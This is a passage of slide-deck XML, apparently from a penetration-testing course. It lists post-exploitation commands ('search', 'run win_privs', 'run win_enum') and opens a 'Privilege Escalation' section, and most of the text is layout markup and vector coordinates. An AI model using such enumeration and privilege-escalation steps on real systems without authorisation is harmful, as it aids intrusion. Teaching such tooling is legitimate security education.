                          <a:cs typeface="Inconsolata SemiBold"/>
                          <a:sym typeface="Inconsolata SemiBold"/>
                        </a:rPr>
                        <a:t>search:</a:t>
                      </a:r>
                      <a:endParaRPr sz="1500">
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:latin typeface="Inconsolata SemiBold"/>
                        <a:ea typeface="Inconsolata SemiBold"/>
                        <a:cs typeface="Inconsolata SemiBold"/>
                        <a:sym typeface="Inconsolata SemiBold"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45700" marB="45700"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lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1300">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Searches for resources, similar to the </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en">
                          <a:solidFill>
                            <a:schemeClr val="lt1"/>
                          </a:solidFill>
                          <a:highlight>
                            <a:schemeClr val="dk2"/>
                          </a:highlight>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>find</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en" sz="1300">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t> command in Linux</a:t>
                      </a:r>
                      <a:endParaRPr sz="1300">
                        <a:solidFill>
                          <a:schemeClr val="dk2"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45700" marB="45700"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r>
              <a:tr h="635150">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1500">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Inconsolata SemiBold"/>
                          <a:ea typeface="Inconsolata SemiBold"/>
                          <a:cs typeface="Inconsolata SemiBold"/>
                          <a:sym typeface="Inconsolata SemiBold"/>
                        </a:rPr>
                        <a:t>run win_privs:</a:t>
                      </a:r>
                      <a:endParaRPr sz="1500">
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:latin typeface="Inconsolata SemiBold"/>
                        <a:ea typeface="Inconsolata SemiBold"/>
                        <a:cs typeface="Inconsolata SemiBold"/>
                        <a:sym typeface="Inconsolata SemiBold"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45700" marB="45700"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lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1300">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Provides more detailed Windows privilege information</a:t>
                      </a:r>
                      <a:endParaRPr sz="1300">
                        <a:solidFill>
                          <a:schemeClr val="dk2"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45700" marB="45700"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1"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="658500">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1500">
                          <a:solidFill>
                            <a:srgbClr val="FFFFFF"/>
                          </a:solidFill>
                          <a:latin typeface="Inconsolata SemiBold"/>
                          <a:ea typeface="Inconsolata SemiBold"/>
                          <a:cs typeface="Inconsolata SemiBold"/>
                          <a:sym typeface="Inconsolata SemiBold"/>
                        </a:rPr>
                        <a:t>run win_enum:</a:t>
                      </a:r>
                      <a:endParaRPr sz="1500">
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:latin typeface="Inconsolata SemiBold"/>
                        <a:ea typeface="Inconsolata SemiBold"/>
                        <a:cs typeface="Inconsolata SemiBold"/>
                        <a:sym typeface="Inconsolata SemiBold"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45700" marB="45700"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lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="0"/>
                        </a:spcBef>
                        <a:spcAft>
                          <a:spcPts val="0"/>
                        </a:spcAft>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en" sz="1300">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>Runs a suite of Windows enumerations and stores the </a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="en" sz="1300">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="en" sz="1300">
                          <a:solidFill>
                            <a:schemeClr val="dk2"/>
                          </a:solidFill>
                          <a:latin typeface="Roboto"/>
                          <a:ea typeface="Roboto"/>
                          <a:cs typeface="Roboto"/>
                          <a:sym typeface="Roboto"/>
                        </a:rPr>
                        <a:t>results on the attacking machine</a:t>
                      </a:r>
                      <a:endParaRPr sz="1300">
                        <a:solidFill>
                          <a:schemeClr val="dk2"/>
                        </a:solidFill>
                        <a:latin typeface="Roboto"/>
                        <a:ea typeface="Roboto"/>
                        <a:cs typeface="Roboto"/>
                        <a:sym typeface="Roboto"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marT="45700" marB="45700"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694" name="Shape 694"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="695" name="Google Shape;695;p89"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="2541900"/>
            <a:ext cx="9144000" cy="7407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solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Privilege Escalation</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="696" name="Google Shape;696;p89"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix amt="12000"/>
          </a:blip>
          <a:srcRect b="21874" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6504875" y="3069475"/>
            <a:ext cx="2639125" cy="2074025"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="697" name="Google Shape;697;p89"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4007346" y="1694919"/>
            <a:ext cx="1129317" cy="846988"/>
            <a:chOff x="412525" y="309400"/>
            <a:chExt cx="6794925" cy="5096200"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="698" name="Google Shape;698;p89"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1457875" y="4811625"/>
              <a:ext cx="4704225" cy="593975"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="23759" w="188169">
                  <a:moveTo>
                    <a:pt x="188168" y="23759"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1" y="23759"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="188168" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="188168" y="23759"/>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89"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="804525" y="843950"/>
              <a:ext cx="6010925" cy="3967700"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="158708" w="240437">
                  <a:moveTo>
                    <a:pt x="214302" y="158707"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="240436" y="49894"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="178189" y="96460"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="120219" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="62248" y="96460"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="49894"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="26135" y="158707"/>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89"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1873650" y="1829925"/>
              <a:ext cx="855350" cy="1057275"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="42291" w="34214">
                  <a:moveTo>
                    <a:pt x="1" y="42291"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3802" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="34213" y="32312"/>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89"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4890975" y="1829925"/>
              <a:ext cx="855350" cy="1057275"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="42291" w="34214">
                  <a:moveTo>
                    <a:pt x="34213" y="42291"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="30412" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="32312"/>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89"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1624200" y="1307250"/>
              <a:ext cx="534575" cy="534575"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="21383" w="21383">
                  <a:moveTo>
                    <a:pt x="21383" y="10929"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="21383" y="10929"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20908" y="12830"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20433" y="14731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19482" y="16631"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18057" y="18057"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16631" y="19482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14731" y="20433"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12830" y="20908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10454" y="21383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10454" y="21383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8553" y="20908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6653" y="20433"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4752" y="19482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3326" y="18057"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1901" y="16631"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="951" y="14731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="475" y="12830"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="10929"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="10929"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="475" y="8553"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="951" y="6653"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1901" y="4752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3326" y="3326"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4752" y="1901"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6653" y="951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8553" y="475"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10454" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10454" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12830" y="475"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14731" y="951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16631" y="1901"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18057" y="3326"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19482" y="4752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20433" y="6653"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20908" y="8553"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21383" y="10929"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21383" y="10929"/>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89"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5473075" y="1307250"/>
              <a:ext cx="522700" cy="534575"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="21383" w="20908">
                  <a:moveTo>
                    <a:pt x="20908" y="10929"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="20908" y="10929"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20908" y="12830"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19957" y="14731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19007" y="16631"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18057" y="18057"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16156" y="19482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14255" y="20433"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12355" y="20908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10454" y="21383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10454" y="21383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8078" y="20908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6177" y="20433"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4277" y="19482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2851" y="18057"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1426" y="16631"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="475" y="14731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="12830"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="10929"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="10929"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="8553"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="475" y="6653"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1426" y="4752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2851" y="3326"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4277" y="1901"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6177" y="951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8078" y="475"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10454" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10454" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12355" y="475"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14255" y="951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16156" y="1901"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18057" y="3326"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19007" y="4752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19957" y="6653"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20908" y="8553"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20908" y="10929"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20908" y="10929"/>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89"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3548625" y="309400"/>
              <a:ext cx="522725" cy="534575"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="21383" w="20909">
                  <a:moveTo>
                    <a:pt x="20908" y="10454"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="20908" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20908" y="12830"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19958" y="14730"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19008" y="16631"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18057" y="18056"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16157" y="19482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14731" y="20432"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12355" y="20908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="21383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="21383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8079" y="20908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6178" y="20432"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4752" y="19482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2852" y="18056"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1901" y="16631"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="951" y="14730"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="12830"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="8553"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="951" y="6652"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1901" y="4752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2852" y="3326"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4752" y="1901"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6178" y="950"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8079" y="475"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12355" y="475"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14731" y="950"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16157" y="1901"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18057" y="3326"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19008" y="4752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19958" y="6652"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20908" y="8553"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20908" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20908" y="10454"/>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89"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="412525" y="1592350"/>
              <a:ext cx="534575" cy="522700"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="20908" w="21383">
                  <a:moveTo>
                    <a:pt x="21383" y="10454"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="21383" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20907" y="12830"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20432" y="14731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19482" y="16631"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18056" y="18057"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16631" y="19482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14730" y="20433"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12830" y="20908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10454" y="20908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10454" y="20908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8553" y="20908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6652" y="20433"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4752" y="19482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3326" y="18057"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1901" y="16631"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="950" y="14731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="475" y="12830"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="475" y="8553"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="950" y="6653"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1901" y="4752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3326" y="3327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4752" y="1901"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6652" y="951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8553" y="476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10454" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10454" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12830" y="476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14730" y="951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16631" y="1901"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18056" y="3327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19482" y="4752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20432" y="6653"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20907" y="8553"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21383" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21383" y="10454"/>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89"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6672875" y="1592350"/>
              <a:ext cx="534575" cy="522700"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="20908" w="21383">
                  <a:moveTo>
                    <a:pt x="21383" y="10454"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="21383" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20908" y="12830"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20433" y="14731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19482" y="16631"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18057" y="18057"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16631" y="19482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14731" y="20433"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12830" y="20908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10929" y="20908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10929" y="20908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8553" y="20908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6653" y="20433"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4752" y="19482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3327" y="18057"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1901" y="16631"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="951" y="14731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="476" y="12830"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="476" y="8553"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="951" y="6653"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1901" y="4752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3327" y="3327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4752" y="1901"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6653" y="951"/>
